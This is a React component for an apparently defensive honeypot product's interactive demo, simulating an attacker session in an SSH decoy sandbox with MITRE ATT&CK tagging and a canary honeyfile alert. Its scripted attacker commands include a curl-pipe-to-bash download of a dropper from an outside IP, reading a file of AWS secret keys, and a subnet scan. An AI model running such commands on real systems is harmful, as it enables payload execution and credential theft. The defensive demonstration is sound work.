import React, { useState, useEffect, useRef } from 'react';
import {
  Terminal,
  Activity,
  Play,
  RotateCcw,
  ShieldAlert,
  Server,
  ArrowRight,
  CheckCircle2,
  AlertTriangle,
  FileCode,
  Copy,
  Check,
  Zap,
  Sparkles,
  ExternalLink,
  CornerDownLeft,
} from 'lucide-react';
import { INITIAL_CAPTURED_INCIDENTS } from '../data/cyberData';

interface SimulatedCommand {
  label: string;
  command: string;
  output: string[];
  ttp: string;
  isCanaryTrip?: boolean;
}

const ATTACKER_COMMANDS: SimulatedCommand[] = [
  {
    label: '1. Reconnaissance (whoami & sysinfo)',
    command: 'whoami && uname -a && id',
    output: [
      'root',
      'Linux decoy-bastion-42 6.8.0-40-generic #41-Ubuntu SMP x86_64 GNU/Linux',
      'uid=0(root) gid=0(root) groups=0(root)',
    ],
    ttp: 'T1082 - System Information Discovery',
  },
  {
    label: '2. Honeyfile Exfiltration (Trip Canary)',
    command: 'cat /var/data/AWS_SECRET_KEYS.env',
    output: [
      '# PRODUCTION AWS IAM ACCESS TOKENS',
      'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE',
      'AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      'AWS_DEFAULT_REGION=us-east-1',
      '# [CANARY_TRIP_BEACON]: https://canary.trinetra.internal/t/x9f8a2',
    ],
    ttp: 'T1552.001 - Credentials in Files (Canary Tripped)',
    isCanaryTrip: true,
  },
  {
    label: '3. Zero-Day Payload Download & Execution',
    command: 'curl -s http://194.26.29.112/dropper_v2.sh | bash',
    output: [
      '[+] Downloading stage-2 loader (SHA256: 8f31b2...)...',
      '[+] Memory injection into daemon pid 1042...',
      '[+] Established C2 reverse beacon to 194.26.29.112:4444',
    ],
    ttp: 'T1059.004 - Unix Shell & T1105 - Ingress Tool Transfer',
  },
  {
    label: '4. Lateral Subnet Scan Attempt',
    command: 'nmap -sS -p 22,445 10.0.0.0/24 --open',
    output: [
      'Starting Nmap 7.94 ( https://nmap.org )...',
      'Host 10.0.0.1: filtered (eBPF Egress Jail Active)',
      'Host 10.0.0.15: filtered (Zero Lateral Movement Permitted)',
      'Nmap done: 256 IP addresses (0 hosts up) scanned in 1.42 seconds',
    ],
    ttp: 'T1046 - Network Service Discovery (Blocked by Jail)',
  },
];

export const InteractivePocWalkthrough: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'terminal' | 'proxy' | 'canary'>('terminal');
  const [activeStepIndex, setActiveStepIndex] = useState<number>(0);
  const [typedInput, setTypedInput] = useState<string>('');
  const [terminalHistory, setTerminalHistory] = useState<
    { command: string; output: string[]; ttp: string; isCanary?: boolean }[]
  >([
    {
      command: ATTACKER_COMMANDS[0].command,
      output: ATTACKER_COMMANDS[0].output,
      ttp: ATTACKER_COMMANDS[0].ttp,
    },
  ]);

  const [proxyLogs, setProxyLogs] = useState<string[]>([
    '[14:22:01] [GATEWAY-9000] Inbound socket 185.220.101.42:49182 -> :9000',
    '[14:22:01] [GATEWAY-9000] TCP Handshake accepted (Window: 65535)',
    '[14:22:01] [CLASSIFIER] Pattern matches CVE-2024-SSH-Spray / T1110.001',
    '[14:22:02] [SILENT_SPLICE] Splice socket to Decoy Pod 10.99.0.42:2222 in 0.38ms',
    '[14:22:02] [DECOY-2222] SSH pseudoterminal allocated (bash session pid 482)',
  ]);

  const [canaryTripped, setCanaryTripped] = useState<boolean>(false);
  const [copiedHash, setCopiedHash] = useState<boolean>(false);
  const [isExecuting, setIsExecuting] = useState<boolean>(false);
  const terminalBottomRef = useRef<HTMLDivElement | null>(null);

  const executeCommand = (cmdObj: SimulatedCommand, index: number) => {
    if (isExecuting) return;
    setIsExecuting(true);
    setActiveStepIndex(index);

    // Append to terminal history
    setTerminalHistory((prev) => [
      ...prev,
      {
        command: cmdObj.command,
        output: cmdObj.output,
        ttp: cmdObj.ttp,
        isCanary: cmdObj.isCanaryTrip,
      },
    ]);

    // Append proxy logs
    const timestamp = new Date().toTimeString().split(' ')[0];
    const newLogs = [
      `[${timestamp}] [DECOY-2222] Keystroke captured: "${cmdObj.command}"`,
      `[${timestamp}] [STREAMLIT-CTI] Auto-tagged MITRE ${cmdObj.ttp}`,
    ];

    if (cmdObj.isCanaryTrip) {
      newLogs.push(
        `[${timestamp}] [CANARY_ALERT] Honeyfile /var/data/AWS_SECRET_KEYS.env accessed! Beacon URL pinged.`
      );
      setCanaryTripped(true);
    }

    setProxyLogs((prev) => [...prev, ...newLogs]);

    setTimeout(() => {
      setIsExecuting(false);
      terminalBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 300);
  };

  const handleCustomSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!typedInput.trim()) return;

    const matched = ATTACKER_COMMANDS.find(
      (c) => c.command.toLowerCase().includes(typedInput.trim().toLowerCase())
    );

    if (matched) {
      executeCommand(matched, ATTACKER_COMMANDS.indexOf(matched));
    } else {
      const timestamp = new Date().toTimeString().split(' ')[0];
      setTerminalHistory((prev) => [
        ...prev,
        {
          command: typedInput,
          output: [`bash: ${typedInput}: command trapped in decoy sandbox`],
          ttp: 'T1059 - Command and Scripting Interpreter',
        },
      ]);
      setProxyLogs((prev) => [
        ...prev,
        `[${timestamp}] [DECOY-2222] Keystroke logged: "${typedInput}"`,
      ]);
    }

    setTypedInput('');
    setTimeout(() => {
      terminalBottomRef.current?.scrollIntoView({ behavior: 'smooth' });
    }, 200);
  };

  const handleReset = () => {
    setActiveStepIndex(0);
    setTerminalHistory([
      {
        command: ATTACKER_COMMANDS[0].command,
        output: ATTACKER_COMMANDS[0].output,
        ttp: ATTACKER_COMMANDS[0].ttp,
      },
    ]);
    setProxyLogs([
      '[14:22:01] [GATEWAY-9000] Inbound socket 185.220.101.42:49182 -> :9000',
      '[14:22:01] [GATEWAY-9000] TCP Handshake accepted (Window: 65535)',
      '[14:22:01] [CLASSIFIER] Pattern matches CVE-2024-SSH-Spray / T1110.001',
      '[14:22:02] [SILENT_SPLICE] Splice socket to Decoy Pod 10.99.0.42:2222 in 0.38ms',
      '[14:22:02] [DECOY-2222] SSH pseudoterminal allocated (bash session pid 482)',
    ]);
    setCanaryTripped(false);
  };

  return (
    <section
      id="interactive-demo"
      className="py-20 md:py-28 relative bg-[#080C14] border-t border-white/[0.08]"
    >
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        {/* Section Header */}
        <div className="text-center max-w-4xl mx-auto mb-16">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded bg-[#0A1018] border border-emerald-500/30 text-xs font-mono text-[#05DF85] mb-4">
            <Terminal className="w-3.5 h-3.5" />
            <span className="font-bold tracking-widest uppercase text-[10px]">FUNCTIONAL POC VALIDATION</span>
          </div>
          <h2 className="font-display text-3xl sm:text-5xl md:text-6xl font-extrabold text-white tracking-tight uppercase">
            INTERACTIVE POC LAB:{' '}
            <span className="text-[#05DF85] block mt-1 text-glow-emerald">
              PHASE 1 IN OPERATION
            </span>
          </h2>
          <p className="mt-4 text-base sm:text-lg text-slate-300 leading-relaxed max-w-2xl mx-auto">
            Experience our validated multi-tier pipeline:{' '}
            <span className="text-[#05DF85] font-mono font-semibold">AsyncIO Proxy Gateway (:9000)</span> ➔{' '}
            <span className="text-amber-400 font-mono font-semibold">SSH Decoy Sandbox (:2222)</span> ➔{' '}
            <span className="text-emerald-300 font-mono font-semibold">Streamlit CTI Telemetry</span>.
          </p>
        </div>

        {/* 3-Step Flow Pipeline Bar */}
        <div className="mb-8 p-3 rounded-lg tactical-panel grid grid-cols-1 md:grid-cols-3 gap-3 text-xs font-mono">
          <div className="flex items-center gap-3.5 p-3 rounded bg-[#05080E] border border-emerald-500/30">
            <span className="w-6 h-6 rounded bg-emerald-500/20 text-[#05DF85] border border-emerald-500/40 flex items-center justify-center font-bold text-xs">
              01
            </span>
            <div>
              <div className="text-white font-bold uppercase tracking-wider text-[11px]">AsyncIO Proxy Gateway</div>
              <div className="text-emerald-400 text-[10px]">Port 9000 (Socket Splice: 0.38ms)</div>
            </div>
          </div>

          <div className="flex items-center gap-3.5 p-3 rounded bg-[#05080E] border border-amber-500/30">
            <span className="w-6 h-6 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 flex items-center justify-center font-bold text-xs">
              02
            </span>
            <div>
              <div className="text-white font-bold uppercase tracking-wider text-[11px]">SSH Decoy Sandbox Pod</div>
              <div className="text-amber-300 text-[10px]">Port 2222 (Honeyfiles &amp; Canary)</div>
            </div>
          </div>

          <div className="flex items-center gap-3.5 p-3 rounded bg-[#05080E] border border-emerald-500/30">
            <span className="w-6 h-6 rounded bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 flex items-center justify-center font-bold text-xs">
              03
            </span>
            <div>
              <div className="text-white font-bold uppercase tracking-wider text-[11px]">Streamlit SOC Telemetry</div>
              <div className="text-emerald-400 text-[10px]">Automated MITRE ATT&amp;CK TTPs</div>
            </div>
          </div>
        </div>

        {/* Main 2-Column Console Layout */}
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
          {/* Left Column: Attacker Interactive Console (Span 7) */}
          <div className="lg:col-span-7 rounded-lg tactical-panel corner-bracket p-5 sm:p-6 shadow-2xl">
            <div className="flex items-center justify-between pb-4 mb-4 border-b border-white/10">
              <div className="flex items-center gap-2.5">
                <span className="w-2.5 h-2.5 rounded-full bg-rose-500" />
                <span className="w-2.5 h-2.5 rounded-full bg-amber-500" />
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-500" />
                <span className="text-xs font-mono text-slate-300 ml-2 font-bold">
                  root@decoy-bastion-42:~#
                </span>
              </div>

              <div className="flex items-center gap-2">
                <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-emerald-950 text-[#05DF85] border border-emerald-500/40 font-bold">
                  SANDBOX JAIL ACTIVE
                </span>
                <button
                  onClick={handleReset}
                  className="p-1.5 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors cursor-pointer"
                  title="Reset Terminal"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                </button>
              </div>
            </div>

            {/* Terminal View Output */}
            <div className="bg-slate-950 rounded-xl p-4.5 font-mono text-xs text-slate-200 h-80 overflow-y-auto space-y-3.5 border border-white/10 select-text">
              <div className="text-slate-500 text-[11px] leading-relaxed">
                # Connected to isolated high-interaction sandbox on Port 2222.
                <br />
                # Enter commands below or click the predefined attack actions.
              </div>

              {terminalHistory.map((item, idx) => (
                <div key={idx} className="space-y-1.5">
                  <div className="flex items-center gap-2 text-rose-400 font-bold">
                    <span className="text-slate-500">root@decoy-bastion-42:~#</span>
                    <span>{item.command}</span>
                  </div>

                  <div className="pl-4 border-l-2 border-slate-800 space-y-1 text-slate-300">
                    {item.output.map((line, lidx) => (
                      <div
                        key={lidx}
                        className={
                          item.isCanary
                            ? 'text-amber-300 font-bold'
                            : line.includes('Established C2')
                            ? 'text-rose-400 font-semibold'
                            : 'text-slate-300'
                        }
                      >
                        {line}
                      </div>
                    ))}
                  </div>

                  <div className="text-[10px] text-[#05DF85] pt-0.5 flex items-center gap-1.5">
                    <span className="text-slate-500">Intercepted MITRE Tag:</span>
                    <span className="px-1.5 py-0.2 rounded bg-emerald-950 border border-emerald-500/30 font-semibold">
                      {item.ttp}
                    </span>
                  </div>
                </div>
              ))}
              <div ref={terminalBottomRef} />
            </div>

            {/* Custom Terminal Command Input */}
            <form onSubmit={handleCustomSubmit} className="mt-4 flex items-center gap-2">
              <div className="relative flex-1">
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs font-mono text-slate-500 font-bold">
                  $
                </span>
                <input
                  type="text"
                  value={typedInput}
                  onChange={(e) => setTypedInput(e.target.value)}
                  placeholder="Type attacker command (e.g. cat /var/data/AWS_SECRET_KEYS.env, ls, id)..."
                  className="w-full pl-7 pr-3 py-2 rounded-xl bg-slate-950 border border-white/10 text-xs font-mono text-white placeholder-slate-500 focus:outline-none focus:border-[#05DF85]"
                />
              </div>
              <button
                type="submit"
                className="p-2 rounded-xl bg-[#05DF85] hover:bg-[#00F59B] text-slate-950 transition-colors cursor-pointer"
                title="Execute command"
              >
                <CornerDownLeft className="w-4 h-4" />
              </button>
            </form>

            {/* Quick Action Attack Injector Buttons */}
            <div className="mt-4 pt-4 border-t border-white/10 space-y-2">
              <div className="text-[11px] font-mono text-slate-400 font-bold uppercase tracking-wider flex items-center gap-1.5">
                <Zap className="w-3.5 h-3.5 text-[#05DF85]" />
                <span>Simulated Attack Playbook:</span>
              </div>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                {ATTACKER_COMMANDS.map((cmd, idx) => (
                  <button
                    key={idx}
                    onClick={() => executeCommand(cmd, idx)}
                    disabled={isExecuting}
                    className={`p-2.5 rounded-xl text-left font-mono text-xs transition-all border cursor-pointer ${
                      activeStepIndex === idx
                        ? 'bg-emerald-950/80 border-[#05DF85] text-white shadow-[0_0_15px_rgba(5,223,133,0.2)]'
                        : 'bg-slate-950/60 border-white/[0.08] text-slate-300 hover:text-white hover:border-white/20'
                    }`}
                  >
                    <div className="font-bold text-white text-[11px]">{cmd.label}</div>
                    <div className="text-[10px] text-emerald-400/80 truncate mt-0.5">
                      <code>{cmd.command}</code>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>

          {/* Right Column: SOC CTI & Streamlit Dashboard Feed (Span 5) */}
          <div className="lg:col-span-5 space-y-5">
            {/* Live Streamlit Forensic Capture Feed */}
            <div className="rounded-2xl glass-card p-5 font-mono text-xs">
              <div className="flex items-center justify-between pb-3 mb-3 border-b border-white/10">
                <div className="flex items-center gap-2 text-emerald-300 font-bold">
                  <Activity className="w-4 h-4 text-[#05DF85]" />
                  <span>STREAMLIT CTI LIVE MONITOR</span>
                </div>
                <span className="w-2 h-2 rounded-full bg-[#05DF85] animate-pulse" />
              </div>

              <div className="space-y-2 max-h-52 overflow-y-auto pr-1">
                {proxyLogs.map((log, idx) => (
                  <div
                    key={idx}
                    className={`text-[11px] leading-relaxed p-1.5 rounded ${
                      log.includes('CANARY_ALERT')
                        ? 'bg-amber-950/60 text-amber-300 border border-amber-500/40 font-bold'
                        : log.includes('SILENT_SPLICE')
                        ? 'bg-emerald-950/50 text-[#05DF85]'
                        : 'text-slate-300'
                    }`}
                  >
                    {log}
                  </div>
                ))}
              </div>
            </div>

            {/* Canary Trip Alert Box */}
            <div
              className={`rounded-2xl p-4.5 border transition-all duration-300 font-mono text-xs ${
                canaryTripped
                  ? 'bg-amber-950/40 border-amber-500 shadow-[0_0_25px_rgba(245,158,11,0.25)]'
                  : 'glass-card border-white/10'
              }`}
            >
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <AlertTriangle
                    className={`w-4 h-4 ${canaryTripped ? 'text-amber-400 animate-bounce' : 'text-slate-400'}`}
                  />
                  <span className="font-bold text-white uppercase tracking-wider">
                    {canaryTripped ? 'CANARY HONEYFILE TRIPPED!' : 'CANARY HONEYTOKEN STATUS'}
                  </span>
                </div>
                <span
                  className={`px-2 py-0.5 rounded text-[10px] font-bold ${
                    canaryTripped
                      ? 'bg-amber-900 text-amber-300 border border-amber-500/50'
                      : 'bg-slate-800 text-slate-400'
                  }`}
                >
                  {canaryTripped ? 'EXFILTRATED' : 'ARMED & MONITORING'}
                </span>
              </div>

              <p className="text-[11px] text-slate-300 leading-relaxed">
                Canary File: <code className="text-amber-300">/var/data/AWS_SECRET_KEYS.env</code>.
                When opened, an out-of-band HTTP beacon alerts the SOC with zero false positives.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};
